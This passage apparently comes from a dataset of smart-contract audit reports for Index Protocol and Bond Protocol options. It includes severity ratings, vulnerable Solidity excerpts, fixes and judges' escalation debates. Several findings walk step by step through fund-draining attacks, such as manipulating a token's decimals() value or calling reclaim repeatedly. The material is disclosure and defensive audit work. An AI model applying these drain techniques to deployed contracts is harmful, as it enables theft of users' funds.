unintentionally, when a lot of bid transactions get executed in the same block.\nAgreed with this. Given the nature of a dutch auction, the temporary DOS will prevent the auction from executing as expected and lead to assets being sold under market value.\npblivin0x\nI agree this is a valid Medium\n0xauditsea\nvalid Medium? 🤔🤔🤔\n0xauditsea\nHere's the docs about the severity of DOS: https://docs.sherlock.xyz/audits/judging/judging\n\nHope this helps in escalation! Thanks y'all! 👍\nhrishibhat\n@0xauditsea @JJtheAndroid There seems to be some confusion about the rule for DOS. Funds not being accessible temporarily does not apply here. Here the DOS results in loss of funds which is considered to be a medium:\nAgreed with this. Given the nature of a dutch auction, the temporary DOS will prevent the auction from executing as expected and lead to assets being sold under market value.\n0xauditsea\n@hrishibhat - Why is there loss of funds at all? The auction has minimum price defined which can be lower than the market value, that's totally fine for users to buy tokens with lower price, it's benefit for users, acceptable for auction manager.\nhrishibhat\n@pblivin0x @0xauditsea Correct me if I'm wrong, assuming here it is a Dutch auction where price reduces over time. If i can DOS someone who is ready to bid for a higher price and I bid for a lesser price after some time. Isn't this an issue?\nhrishibhat\nTo add to my comment: the Max min values are values that are acceptable by the manager if the users decide to bid for the value within that range. That does not mean the code should unfairly allow someone to stop a higher bid and bid at a lower price. This seems like valid issue that does not allow normal functioning of dutch auction.\n0xauditsea\n@hrishibhat - In selling auction (users buy component), component price goes lower as time goes. So when it's front-run, the user will try again with lower price, which is fine for the user, also no problem with the auction manager.\n0xauditsea\nThis is basically not loss of funds.\nJJtheAndroid\nTo add to my comment: the Max min values are values that are acceptable by the manager if the users decide to bid for the value within that range. That does not mean the code should unfairly allow someone to stop a higher bid and bid at a lower price. This seems like valid issue that does not allow normal functioning of dutch auction.\nI don't want to go back and forth on this. I just want to say that your description is inaccurate. The report does not describe DOS on higher bids, it is a DOS on full inventory bids which is a rarer occurrence. Big difference. Also such an ""attack"" does not benefit the attacker nor does it hurt the ""victim"" because they both want to buy assets at a lower price.\nFinally, there is a min price bound set by the manager. So any full inventory DOS at that point is completely useless and a waste of gas.\nAll of this is assuming that there are only 2 actors (the attacker and the victim) bidding. In reality, there will likely be many more and not all of them will submit a full inventory bid.\nI will not comment on this further\npblivin0x\n@pblivin0x @0xauditsea Correct me if I'm wrong, assuming here it is a Dutch auction where price reduces over time. If i can DOS someone who is ready to bid for a higher price and I bid for a lesser price after some time. Isn't this an issue?\nWe have a 1000 ETH auction, a legitimate bidder wants to settle the full 1000 ETH auction at `PRICE_HIGH`\nThe malicious bidder is willing to settle the 1000 ETH auction at `PRICE_LOW`, so they frontrun the legitimate bidder with `SMALL_SIZE` bid.\nIf some transactions are successfully DOS'd, the legitimate bidder could submit a 1000 ETH - `SMALL_SIZE` bid, or something like a 500 ETH bid, such that the malicious bidder is not willing to front run at that size\nOot2k\nEscalate This issue should be low/invalid as per Sherlock's rules https://docs.sherlock.xyz/audits/judging/judging. In addition, this is an edge case with no user funds at risk.\nCan't agree on this. This is definitely not an edge case. There is an incentive to perform such kind of a DoS - If the price of the auction decreases over time, users will probably want to prolong it as much as they can. Additionally, the DoS can very easily happen unintentionally, when a lot of bid transactions get executed in the same block.\nI think this is valid, this comment explains it well.\n0xauditsea\n@pblivin0x @0xauditsea Correct me if I'm wrong, assuming here it is a Dutch auction where price reduces over time. If i can DOS someone who is ready to bid for a higher price and I bid for a lesser price after some time. Isn't this an issue?\nWe have a 1000 ETH auction, a legitimate bidder wants to settle the full 1000 ETH auction at `PRICE_HIGH`\nThe malicious bidder is willing to settle the 1000 ETH auction at `PRICE_LOW`, so they frontrun the legitimate bidder with `SMALL_SIZE` bid.\nIf some transactions are successfully DOS'd, the legitimate bidder could submit a 1000 ETH - `SMALL_SIZE` bid, or something like a 500 ETH bid, such that the malicious bidder is not willing to front run at that size\nTotally agree with this, no way front-runners would try it.\nArabadzhiew\n@pblivin0x @0xauditsea Correct me if I'm wrong, assuming here it is a Dutch auction where price reduces over time. If i can DOS someone who is ready to bid for a higher price and I bid for a lesser price after some time. Isn't this an issue?\nWe have a 1000 ETH auction, a legitimate bidder wants to settle the full 1000 ETH auction at `PRICE_HIGH`\nThe malicious bidder is willing to settle the 1000 ETH auction at `PRICE_LOW`, so they frontrun the legitimate bidder with `SMALL_SIZE` bid.\nIf some transactions are successfully DOS'd, the legitimate bidder could submit a 1000 ETH - `SMALL_SIZE` bid, or something like a 500 ETH bid, such that the malicious bidder is not willing to front run at that size\nCorrect me if I'm wrong, but even in your example, the legitimate bidder is most likely still going to end up buying the ETH at a lower price, leading to the protocol receiving less assets that it could have received.\nThe main issue here is that due to the current implementation, full inventory purchases are going to end up being reverted most of the time, be it due to intentional DoS attacks, or simply because there were a lot of bid transactions executed at the given time (for example, if there were 5 bid transactions sitting in the mempool with the same gas price and one of them was for a full inventory purchase, if that one does not get executed first, it will simply be reverted), leading to the component assets being sold at lower prices.\n0xauditsea\n@Arabadzhiew You guys keep saying components are being sold at lower prices, if auction manager doesn't want them to be sold at lower prices, they should increase MIN price. When auction manager defines MIN price, it surely means that purchase at MIN price is pretty acceptable, this is pretty logical thing. Components being sold at lower price, good for buyers, acceptable for the auction manager, what is the problem here at all?\nRegarding the example you mentioned above, you are right that full purchase bid will be reverted when there is another bid tx is executed before it, I think that's fine, that's what the auction is for - first buyer gets what they want. If you don't agree with this and let full purchase tx buy all remaining amount, it will cause an issue like, users wanted to buy whole 10WETH from the auction but they end up only buying 5WETH, do you think users will like this?\nOfc this issue needs to be fixed, but the severity can not be Med at all.\nArabadzhiew\n@Arabadzhiew You guys keep saying components are being sold at lower prices, if auction manager doesn't want them to be sold at lower prices, they should increase MIN price. When auction manager defines MIN price, it surely means that purchase at MIN price is pretty acceptable, this is pretty logical thing. Components being sold at lower price, good for buyers, acceptable for the auction manager, what is the problem here at all?\nRegarding the example you mentioned above, you are right that full purchase bid will be reverted when there is another bid tx is executed before it, I think that's fine, that's what the auction is for - first buyer gets what they want. If you don't agree with this and let full purchase tx buy all remaining amount, it will cause an issue like, users wanted to buy whole 10WETH from the auction but they end up only buying 5WETH, do you think users will like this?\nOfc this issue needs to be fixed, but the severity can not be Med at all.\nSure, the MIN value is defined by the auction manager, but the fact that the component asset is going to be sold at a lower price is still a loss of funds for the protocol. The MIN value is there to make sure that the auction targets get reached, but I don't think the protocol team should be ok with receiving less assets, when they can receive more.\nAlso, regarding the mitigation recommended in this report, I think it is fine due to the fact that it is optional - users can only use the entire available balance purchase functionality if they explicitly say so, otherwise the bidding functionality should work as it currently does.\nI won't comment on this issue any further. Let's let the Sherlock team decide whether it is a valid medium or not.\nhrishibhat\nResult: Medium Has duplicates After consideration of the above comments this issue is a valid medium, DOS of a valid bid at a certain price in a Dutch auction is considered damage to how the auction functions.\nsherlock-admin2\nEscalations have been resolved successfully!\nEscalation status:\nJJtheAndroid: rejected\nhrishibhat\nAdditionally, I see that the Sherlock rules are being interpreted incorrectly, will make sure to make the necessary changes to the docs and see how best any possible confusion can be avoided.\npblivin0x\nThe remediation for this issue is open for review here https://github.com/IndexCoop/index-protocol/pull/25"чMalicious user can DOS legitimate users attempting to purchase the entire amount of component\nCode Snippet\nTool used\nManual Review
All fund from Teller contract can be drained because a malicious receiver can call reclaim repeatedlyчhighч```\n       // Revert if caller is not receiver\n        if (msg.sender != receiver) revert Teller_NotAuthorized();\n\n        // Transfer remaining collateral to receiver\n        uint256 amount = optionToken.totalSupply();\n        if (call) {\n            payoutToken.safeTransfer(receiver, amount);\n        } else {\n            // Calculate amount of quote tokens equivalent to amount at strike price\n            uint256 quoteAmount = amount.mulDiv(strikePrice, 10 ** payoutToken.decimals());\n            quoteToken.safeTransfer(receiver, quoteAmount);\n        }\n```\nчAll fund from Teller contract can be drained because a malicious receiver can call reclaim repeatedly\nWhen mint an option token, the user is required to transfer the payout token for a call option or quote token for a put option\nif after the expiration, the receiver can call reclaim to claim the payout token if the option type is call or claim the quote token if the option type is put\nhowever, the root cause is when reclaim the token, the corresponding option is not burnt (code)\n```\n       // Revert if caller is not receiver\n        if (msg.sender != receiver) revert Teller_NotAuthorized();\n\n        // Transfer remaining collateral to receiver\n        uint256 amount = optionToken.totalSupply();\n        if (call) {\n            payoutToken.safeTransfer(receiver, amount);\n        } else {\n            // Calculate amount of quote tokens equivalent to amount at strike price\n            uint256 quoteAmount = amount.mulDiv(strikePrice, 10 ** payoutToken.decimals());\n            quoteToken.safeTransfer(receiver, quoteAmount);\n        }\n```\n\nthe Teller contract is likely to hold fund from multiple option token\na malicious actor can create call Teller#deploy and set a receiver address that can control by himself\nand then wait for the option expiry and repeated call reclaim to steal the fund from the Teller contractч
All funds can be stolen from FixedStrikeOptionTeller using a token with malicious decimalsчhighч```\n    function create(\n        FixedStrikeOptionToken optionToken_,\n        uint256 amount_\n    ) external override nonReentrant {\n        // rest of code\n        if (call) {\n            // rest of code\n        } else {\n            uint256 quoteAmount = amount_.mulDiv(strikePrice, 10 ** payoutToken.decimals());\n            // rest of code\n            quoteToken.safeTransferFrom(msg.sender, address(this), quoteAmount);\n            // rest of code\n        }\n\n        optionToken.mint(msg.sender, amount_);\n    }\n```\nч`FixedStrikeOptionTeller` is a single contract which deploys multiple option tokens. Hence this single contract holds significant payout/quote tokens as collateral. Also the `deploy`, `create` & `exercise` functions of this contract can be called by anyone.\nThis mechanism can be exploited to drain `FixedStrikeOptionTeller` of all tokens.\nThis is how the create functions looks like:\n```\n    function create(\n        FixedStrikeOptionToken optionToken_,\n        uint256 amount_\n    ) external override nonReentrant {\n        // rest of code\n        if (call) {\n            // rest of code\n        } else {\n            uint256 quoteAmount = amount_.mulDiv(strikePrice, 10 ** payoutToken.decimals());\n            // rest of code\n            quoteToken.safeTransferFrom(msg.sender, address(this), quoteAmount);\n            // rest of code\n        }\n\n        optionToken.mint(msg.sender, amount_);\n    }\n```\n\nexercise function:\n```\n    function exercise(\n        FixedStrikeOptionToken optionToken_,\n        uint256 amount_\n    ) external override nonReentrant {\n        // rest of code\n        uint256 quoteAmount = amount_.mulDiv(strikePrice, 10 ** payoutToken.decimals());\n\n        if (msg.sender != receiver) {\n            // rest of code\n        }\n\n        optionToken.burn(msg.sender, amount_);\n\n        if (call) {\n            // rest of code\n        } else {\n            quoteToken.safeTransfer(msg.sender, quoteAmount);\n        }\n    }\n```\n\nConsider this attack scenario:\nLet's suppose the `FixedStrikeOptionTeller` holds some DAI tokens.\nAn attacker can create a malicious payout token of which he can control the `decimals`.\nThe attacker calls `deploy` to create an option token with malicious payout token and DAI as quote token and `put` option type\nMake `payoutToken.decimals` return a large number and call `FixedStrikeOptionTeller.create` with input X. Here `quoteAmount` will be calculated as `0`.\n```\n// Calculate amount of quote tokens required to mint\nuint256 quoteAmount = amount_.mulDiv(strikePrice, 10 ** payoutToken.decimals());\n\n// Transfer quote tokens from user\n// Check that amount received is not less than amount expected\n// Handles edge cases like fee-on-transfer tokens (which are not supported)\nuint256 startBalance = quoteToken.balanceOf(address(this));\nquoteToken.safeTransferFrom(msg.sender, address(this), quoteAmount);\n```\n\nSo 0 DAI will be pulled from the attacker's account but he will receive X option token.\nMake `payoutToken.decimals` return a small value and call `FixedStrikeOptionTeller.exercise` with X input. Here `quoteAmount` will be calculated as a very high number (which represents number of DAI tokens). So he will receive huge amount of DAI against his X option tokens when exercise the option or when reclaim the token\n```\n// Transfer remaining collateral to receiver\nuint256 amount = optionToken.totalSupply();\nif (call) {\n payoutToken.safeTransfer(receiver, amount);\n} else {\n // Calculate amount of quote tokens equivalent to amount at strike price\n uint256 quoteAmount = amount.mulDiv(strikePrice, 10 ** payoutToken.decimals());\n quoteToken.safeTransfer(receiver, quoteAmount);\n}\n```\n\nHence, the attacker was able to drain all DAI tokens from the `FixedStrikeOptionTeller` contract. The same mechanism can be repeated to drain all other ERC20 tokens from the `FixedStrikeOptionTeller` contract by changing the return value of the decimal external callчConsider storing the `payoutToken.decimals` value locally instead of fetching it real-time on all `exercise` or `reclaim` calls.\nor support payout token and quote token whitelist, if the payout token and quote token are permissionless created, there will always be high risk\nDiscussion\nctf-sec\nhttps://github.com/sherlock-audit/2023-06-bond-judging/issues/8 is the duplicate of this issue\nOighty\nAgree with this issue. The simplest solution seems to be stored the decimal values used when the option token is deployed.\nOighty\nFix implemented at https://github.com/Bond-Protocol/options/pull/3\nctf-sec\nThis is a big one and a important one, will look into the fix\nctf-sec\nThe fix looks good, the decimals call is properly cached, I highly recommend adding a test to make sure it is working as intended\nOighty\nI added some tests to confirm the cached decimal behavior on create and exercise to the PR.\nctf-sec\nThanks for adding the test cases! All good!чAnyone can drain `FixedStrikeOptionTeller` contract of all ERC20 tokens. The cost of attack is negligible (only gas cost).\nHigh impact, high likelyhood.\nCode Snippet\nTool used\nManual Review
Blocklisted address can be used to lock the option token minter's fundчmediumч```\n\n```\nчBlocklisted address can be used to lock the option token minter's fund\nWhen deploy a token via the teller contract, the contract validate that receiver address is not address(0)\nHowever, a malicious option token creator can save a seemingly favorable strike price and pick a blocklisted address and set the blocklisted address as receiver\nhttps://github.com/d-xo/weird-erc20#tokens-with-blocklists\nSome tokens (e.g. USDC, USDT) have a contract level admin controlled address blocklist. If an address is blocked, then transfers to and from that address are forbidden.\nMalicious or compromised token owners can trap funds in a contract by adding the contract address to the blocklist. This could potentially be the result of regulatory action against the contract itself, against a single user of the contract (e.g. a Uniswap LP), or could also be a part of an extortion attempt against users of the blocked contract.\nthen user would see the favorable strike price and mint the option token using payout token for call option or use quote token for put option\nHowever, they can never exercise their option because the transaction would revert when transferring asset to the recevier for call option and transferring asset to the receiver for put option when exercise the option.\n```\n\n```\n\nthe usre's fund that used to mint the option are lockedч
Loss of option token from Teller and reward from OTLM if L2 sequencer goes downчmediumч```\n    // Validate that option token is not expired\n        if (uint48(block.timestamp) >= expiry) revert Teller_OptionExpired(expiry);\n```\nчLoss of option token from Teller and reward from OTLM if L2 sequencer goes down\nIn the current implementation, if the option token expires, the user is not able to exerise the option at strike price\n```\n    // Validate that option token is not expired\n        if (uint48(block.timestamp) >= expiry) revert Teller_OptionExpired(expiry);\n```\n\nif the option token expires, the user lose rewards from OTLM as well when claim the reward\n```\n    function _claimRewards() internal returns (uint256) {\n        // Claims all outstanding rewards for the user across epochs\n        // If there are unclaimed rewards from epochs where the option token has expired, the rewards are lost\n\n        // Get the last epoch claimed by the user\n        uint48 userLastEpoch = lastEpochClaimed[msg.sender];\n```\n\nand\n```\n    // If the option token has expired, then the rewards are zero\n        if (uint256(optionToken.expiry()) < block.timestamp) return 0;\n```\n\nAnd in the onchain context, the protocol intends to deploy the contract in arbitrum and optimsim\n```\nQ: On what chains are the smart contracts going to be deployed?\nMainnet, Arbitrum, Optimism\n```\n\nHowever, If Arbitrum and optimism layer 2 network, the sequencer is in charge of process the transaction\nFor example, the recent optimism bedrock upgrade cause the sequencer not able to process transaction for a hew hours\nhttps://cryptopotato.com/optimism-bedrock-upgrade-release-date-revealed/\nBedrock Upgrade According to the official announcement, the upgrade will require 2-4 hours of downtime for OP Mainnet, during which there will be downtime at the chain and infrastructure level while the old sequencer is spun down and the Bedrock sequencer starts up.\nTransactions, deposits, and withdrawals will also remain unavailable for the duration, and the chain will not be progressing. While the read access across most OP Mainnet nodes will stay online, users may encounter a slight decrease in performance during the migration process.\nIn Arbitrum\nhttps://thedefiant.io/arbitrum-outage-2\nArbitrum Goes Down Citing Sequencer Problems Layer 2 Arbitrum suffers 10 hour outage.\nand\nhttps://beincrypto.com/arbitrum-sequencer-bug-causes-temporary-transaction-pause/\nEthereum layer-2 (L2) scaling solution Arbitrum stopped processing transactions on June 7 because its sequencer faced a bug in the batch poster. The incident only lasted for an hour.\nIf the option expires during the sequencer down time, the user basically have worthless option token because they cannot exercise the option at strike priceч"chainlink has a sequencer up feed\nhttps://docs.chain.link/data-feeds/l2-sequencer-feeds\nconsider integrate the up time feed and give user extra time to exercise token and claim option token reward if the sequencer goes down\nDiscussion\nOighty\nAcknowledge this issue. Generally, we expect option token durations to be over a week+ duration so users will have a lot of time to exercise. Observed sequencer outages have been measured in hours. Therefore, we view the overall risk to the user as low. However, we will keep this in mind and explore how much complexity it would add to account for this on L2s.\nctf-sec\nOk! Thanks!\n#24 is not a duplicate of this issue, the sequencer check for price should be done in Bond Oracle and it is out of scope in this audit.\nctf-sec\nPast similar finding: https://github.com/sherlock-audit/2023-03-Y2K-judging/issues/422\nctf-sec\nThe report has ""won't fix"" tag, assume the sponsor acknowledge the report.\nOighty\nYep, acknowledge the issue, but we don't plan on implementing a fix for this."чLoss of option token from Teller and reward from OTLM if L2 sequencer goes down\nCode Snippet\nTool used\nManual Review
Use A's staked token balance can be used to mint option token as reward for User B if the payout token equals to the stake tokenчmediumч```\n// Increase the user's stake balance and the total balance\nstakeBalance[msg.sender] = userBalance + amount_;\ntotalBalance += amount_;\n\n// Transfer the staked tokens from the user to this contract\nstakedToken.safeTransferFrom(msg.sender, address(this), amount_);\n```\nчUser's staked token balance can be used to mint option token as reward if the payout token equals to the stake token, can cause user to loss fund\nIn OTLM, user can stake stakeToken in exchange for the option token minted from the payment token\nwhen staking, we transfer the stakedToken in the OTLM token\n```\n// Increase the user's stake balance and the total balance\nstakeBalance[msg.sender] = userBalance + amount_;\ntotalBalance += amount_;\n\n// Transfer the staked tokens from the user to this contract\nstakedToken.safeTransferFrom(msg.sender, address(this), amount_);\n```\n\nbefore the stake or unstake or when we are calling claimReward\nwe are calling _claimRewards -> _claimEpochRewards -> we use payout token to mint and create option token as reward\n```\n payoutToken.approve(address(optionTeller), rewards);\n optionTeller.create(optionToken, rewards);\n\n // Transfer rewards to sender\n ERC20(address(optionToken)).safeTransfer(msg.sender, rewards);\n```\n\nthe problem is, if the stake token and the payout token are the same token, the protocol does not distingush the balance of the stake token and the balance of payout token\nsuppose both stake token and payout token are USDC\nsuppose user A stake 100 USDC\nsuppose user B stake 100 USDC\ntime passed, user B accure 10 token unit reward\nnow user B can claimRewards,\nthe protocol user 10 USDC to mint option token for B\nthe OTLM has 190 USDC\nif user A and user B both call emergencyUnstakeAll, whoeve call this function later will suffer a revert and he is not able to even give up the reward and claim their staked balance back\nbecause a part of the his staked token balance is treated as the payout token to mint option token reward for other userч"Discussion\nOighty\nAgree with this issue. We'll explore both the recommendations.\nctf-sec\nIn the beginning\nhttps://github.com/sherlock-audit/2023-06-bond-judging/issues/85\nthe issue #85 is considered as a separate medium\nroot cause is the code does not really distinguish the payout token and the staking token balance\nleads to two issue\nuser's own staked balance is minted as reward (this even lead to lose of fund but only in the case of staking token equals to payment token, which I see a very likely supported use case, the core invariant that user should always call emergencyUnstakeAll is broken)\nowner that should not remove the user fund can remove the user's fund as payment token\nbut for issue #85\nit requires admin owner mistake although the code is not designed to owner remove staking token\nbut sherlock rules still apply:\nhttps://docs.sherlock.xyz/audits/judging/judging#duplication-rules\n```\n Issues identifying a core vulnerability can be considered duplicates. \n Scenario 1:\nThere is a root cause/error/vulnerability A in the code. This vulnerability A -> leads to two attacks paths:\n  -> high severity path\n-> medium severity attack path/just identifying the vulnerability.\n```\n\nso after internal discussion, issue #85 close and not rewarded just to be fair.\nberndartmueller\nEscalate\nDisagree with the validity of the issue. This is not a valid medium finding\nDue to relying on the contract owner not providing sufficient payout tokens used as rewards, this is considered an admin error and thus not eligible for medium severity.\nIt is assumed that the trusted contract owner of the `OTLM` contract supplies a sufficient amount of payout tokens, even supplying more than anticipated (based on the reward rate). ""Unused"" payout tokens topped up by the owner can always be withdrawn via the `withdrawPayoutTokens` function.\nIn the case that insufficient payout tokens have been supplied by the contract owner, thus utilizing the deposited payout tokens from the users, the owner can always add additional payout token capital to the contract, ensuring that calls to `emergencyUnstakeAll` succeed.\nsherlock-admin\nEscalate\nDisagree with the validity of the issue. This is not a valid medium finding\nDue to relying on the contract owner not providing sufficient payout tokens used as rewards, this is considered an admin error and thus not eligible for medium severity.\nIt is assumed that the trusted contract owner of the `OTLM` contract supplies a sufficient amount of payout tokens, even supplying more than anticipated (based on the reward rate). ""Unused"" payout tokens topped up by the owner can always be withdrawn via the `withdrawPayoutTokens` function.\nIn the case that insufficient payout tokens have been supplied by the contract owner, thus utilizing the deposited payout tokens from the users, the owner can always add additional payout token capital to the contract, ensuring that calls to `emergencyUnstakeAll` succeed.\nYou've created a valid escalation!\nTo remove the escalation from consideration: Delete your comment.\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\nOot2k\nI think the escalation is valid. More of admin input.\nJeffCX\nI already invalidate my finding #85, which is more fair to the reward pot\nInvalid this finding is not fair to me :) here is the argument\nSponsor DM is only for reference\n\nWe need to refer to the doc and read me\nhttps://github.com/sherlock-audit/2023-06-bond/tree/fce1809f83728561dc75078d41ead6d60e15d065/options#otlmsol\n\nIn the doc, I don't see the doc saying the the owner has to provide the payout token so not providing payout token is not an admin error.\nplus\nIt is assumed that the trusted contract owner of the OTLM contract supplies a sufficient amount of payout tokens, even supplying more than anticipated (based on the reward rate). ""Unused"" payout tokens topped up by the owner can always be withdrawn via the withdrawPayoutTokens function.\nIn normal yield farming protocol and staking protocol, the owner can add payment token or he can choose not to,\nEven Sushiswap Master Chef has a emergency unstaking to make sure the insufficient reward does not block user's staking fund\nIn the case that insufficient payout tokens have been supplied by the contract owner, thus utilizing the deposited payout tokens from the users, the owner can always add additional payout token capital to the contract, ensuring that calls to emergencyUnstakeAll succeed.\nEven we use the assumption the admin has to provide the payout token, it is not possible, he can't just provide payout token forever,\ntoken has a limited total supply\nThe only case the admin can provide payout token forever is he can control the token minting.\nThe claim reward and stake toward is designed to let user make money, not lose money\nthe emergency unstake is designed to protect user's which should always not reverting.\nStill feel like leave #85 as invalid and leave this one as medium is a very reasonable severity categorization.\nOot2k\nI agree that emergency unstake should never revert. I also agree with that the admin cant provide tokens forever. Even if the root cause here is that there is not enough supply provided, I think the impact is severe and quit likely to happen.\nSherlock should keep this in mind when reviewing the escaltion.\nberndartmueller\nEven we use the assumption the admin has to provide the payout token, it is not possible, he can't just provide payout token forever,\ntoken has a limited total supply\nThe only case the admin can provide payout token forever is he can control the token minting.\nThat depends on the used token. Many tokens allow minting additional funds by the owner, and many protocols have large token reserves.\nAdditionally, if rewards should be stopped, the owner can use the `setRewardRate` function to reset the reward rate to 0, before running out of payout tokens (payout tokens which were topped up by the owner to be used for minting option rewards).\nJeffCX\nThat depends on the used token. Many tokens allow minting additional funds by the owner, and many protocols have large token reserves.\nIn the case when the admin owner can do that, this is not a issue\nMany protocol don't allow token minting and has a fixed supply, it is very common to hardcode the total supply.\nSetting the reward rate to zero don't seem to help\nBecause in the current codebase, setting the reward rate to zero will only stop the reward from accuring in the current and future epoch\n```\n    function setRewardRate(\n        uint256 rewardRate_\n    ) external onlyOwner requireInitialized updateRewards {\n        // Check if a new epoch needs to be started\n        // We do this to avoid bad state if the reward rate is changed when a new epoch should have started\n        if (block.timestamp >= epochStart + epochDuration) _startNewEpoch();\n\n        // Set the reward rate\n        rewardRate = rewardRate_;\n    }\n```\n\nbut the reward earned from past epoch is still for user to claim\nIf not payout token balance, user's staked balance is used as reward o(╥﹏╥)o\nOighty\nI tend to side with the submitter on this one. The main reason being that staking contracts have often been used in the past with the staked token == payout token and others may want to use the contracts in that way. They also often work that rewards are halted if the owner does not add more funds to them (vs. having direct minting) as a safety measure. With that configuration, one user's stake could be used to pay rewards to another, which would be very bad.\nSince the protocol is permissionless, anyone can create an OTLM pool. Therefore, the input isn't ""admin"" from the protocol perspective. I did message submitter that I thought this was a valuable find. The high likelihood that someone would try to use this configuration (based on past staking contract use) and users would lose funds make this a medium issue.\nOighty\nFix implemented at https://github.com/Bond-Protocol/options/pull/9\nctf-sec\nTo support the use case when payout token is staking token, the contract would need to distinguish the payout token and staking token balance, which add more complexity\nthe current fix make sure the staking token is not the same as the payout token when deploying the OTLM contract, fix looks good!\nberndartmueller\nI tend to side with the submitter on this one. The main reason being that staking contracts have often been used in the past with the staked token == payout token and others may want to use the contracts in that way. They also often work that rewards are halted if the owner does not add more funds to them (vs. having direct minting) as a safety measure. With that configuration, one user's stake could be used to pay rewards to another, which would be very bad.\nSince the protocol is permissionless, anyone can create an OTLM pool. Therefore, the input isn't ""admin"" from the protocol perspective. I did message submitter that I thought this was a valuable find. The high likelihood that someone would try to use this configuration (based on past staking contract use) and users would lose funds make this a medium issue.\nIf the deployer of the permissionless OTML contract is not considered an admin, all issues which have their severity lowered, due to considering them as “admin issues”, should be re-evaluated IMHO (e.g., https://github.com/sherlock-audit/2023-06-bond-judging/issues/55#issuecomment-1632426869). Or alternatively, the OTML owner is considered an admin.\nHappy to hear everyone’s thoughts!\nSilentYuki\n@berndartmueller does have a point here, by the sponsor comment:\n`Since the protocol is permissionless, anyone can create an OTLM pool. Therefore, the input isn't ""admin"" from the protocol perspective.`\nSome of the other issues are judged as lows based on counting the owner of the OTLM as a trusted authority.\njuntzhan\nIt was confirmed by sponsor that OTLM owner is trusted. https://discord.com/channels/812037309376495636/1125440840333013073/1126125997675249674\nThe dispute is if `not providing payout token is not an admin error` rather than if OTLM owner is admin.\nOighty\nSince the protocol is permissionless, anyone can create an OTLM pool. Therefore, the input isn't ""admin"" from the protocol perspective.\nSorry if this was confusing. I do think the OTLM owner is considered trusted. As stated before though, it's likely that someone would try to setup with this configuration and the impact is severe (user's lose deposited principal if it is used to fund rewards). Therefore, I view this as a bigger issue than more standard ""misconfigurations"", which do not put user principal at risk.\nTo phrase differently, I don't think it would be obvious to OTLM owners deploying the contract that this could happen. Therefore, the system should not allow this to happen.\nhrishibhat\nResult: Medium Unique Considering this a valid issue based on the points raised in the final comments from the Sponsor here. The information provided in the readme was not sufficient to understand the core functioning. Sherlock will make sure to avoid such situations in the future.\nsherlock-admin2\nEscalations have been resolved successfully!\nEscalation status:\nberndartmueller: accepted"чIf there are insufficient payout token in the OTLM, the expected behavior is that the transaction revert when claim the reward and when the code use payout token to mint option token\nand in the worst case, user can call emergencyUnstakeAll to get their original staked balane back and give up their reward\nhowever, if the staked token is the same as the payout token,\na part of the user staked token can be mistakenly and constantly mint as option token reward for his own or for other user and eventually when user call emergencyUnstakeAll, there will be insufficient token balance and transaction revert\nso user will not able to get their staked token back\nCode Snippet\nTool used\nManual Review
IERC20(token).approve revert if the underlying ERC20 token approve does not return booleanчmediumч```\n    function approve(address spender, uint256 amount) public virtual returns (bool) {\n        allowance[msg.sender][spender] = amount;\n\n        emit Approval(msg.sender, spender, amount);\n\n        return true;\n    }\n```\nчIERC20(token).approve revert if the underlying ERC20 token approve does not return boolean\nWhen transferring the token, the protocol use safeTransfer and safeTransferFrom\nbut when approving the payout token, the safeApprove is not used\nfor non-standard token such as USDT,\ncalling approve will revert because the solmate ERC20 enforce the underlying token return a boolean\n```\n    function approve(address spender, uint256 amount) public virtual returns (bool) {\n        allowance[msg.sender][spender] = amount;\n\n        emit Approval(msg.sender, spender, amount);\n\n        return true;\n    }\n```\n\nwhile the token such as USDT does not return boolean\nhttps://etherscan.io/address/0xdac17f958d2ee523a2206206994597c13d831ec7#code#L126чUse safeApprove instead of approve\nDiscussion\nOighty\nAgree with proposed solution.\nOighty\nFix implemented in https://github.com/Bond-Protocol/options/pull/8\nctf-sec\nFix looks good!чUSDT or other ERC20 token that does not return boolean for approve is not supported as the payout token\nCode Snippet\nTool used\nManual Review
Division before multiplication result in loss of token reward if the reward update time elapse is smallчmediumч```\n function currentRewardsPerToken() public view returns (uint256) {\n        // Rewards do not accrue if the total balance is zero\n        if (totalBalance == 0) return rewardsPerTokenStored;\n\n        // @audit\n        // loss of precision\n        // The number of rewards to apply is based on the reward rate and the amount of time that has passed since the last reward update\n        uint256 rewardsToApply = ((block.timestamp - lastRewardUpdate) * rewardRate) /\n            REWARD_PERIOD;\n\n        // The rewards per token is the current rewards per token plus the rewards to apply divided by the total staked balance\n        return rewardsPerTokenStored + (rewardsToApply * 10 ** stakedTokenDecimals) / totalBalance;\n    }\n```\nчDivision before multiplication result in loss of token reward\nWhen calcuting the reward, we are calling\n```\n function currentRewardsPerToken() public view returns (uint256) {\n        // Rewards do not accrue if the total balance is zero\n        if (totalBalance == 0) return rewardsPerTokenStored;\n\n        // @audit\n        // loss of precision\n        // The number of rewards to apply is based on the reward rate and the amount of time that has passed since the last reward update\n        uint256 rewardsToApply = ((block.timestamp - lastRewardUpdate) * rewardRate) /\n            REWARD_PERIOD;\n\n        // The rewards per token is the current rewards per token plus the rewards to apply divided by the total staked balance\n        return rewardsPerTokenStored + (rewardsToApply * 10 ** stakedTokenDecimals) / totalBalance;\n    }\n```\n\nthe precision loss can be high because the accumulated reward depends on the time elapse:\n(block.timestamp - lastRewardUpdate)\nand the REWARD_PERIOD is hardcoded to one days:\n```\n    /// @notice Amount of time (in seconds) that the reward rate is distributed over\n    uint48 public constant REWARD_PERIOD = uint48(1 days);\n```\n\nif the time elapse is short and the currentRewardsPerToken is updated frequently, the precision loss can be heavy and even rounded to zero\nthe lower the token precision, the heavier the precision loss\nhttps://github.com/d-xo/weird-erc20#low-decimals\nSome tokens have low decimals (e.g. USDC has 6). Even more extreme, some tokens like Gemini USD only have 2 decimals.\nconsider as extreme case, if the reward token is Gemini USD, the reward rate is set to 1000 * 10 = 10 ** 4 = 10000\nif the update reward keep getting called within 8 seconds\n8 * 10000 / 86400 is already rounded down to zero and no reward is accuring for userчAvoid division before multiplcation and only perform division at last\nDiscussion\nOighty\nAgree with potential precision loss at low decimal numbers and suggested fix.\nOighty\nFix implemented at https://github.com/Bond-Protocol/options/pull/7\nctf-sec\nFix looks goodчDivision before multiplication result in loss of token reward if the reward update time elapse is small\nCode Snippet\nTool used\nManual Review
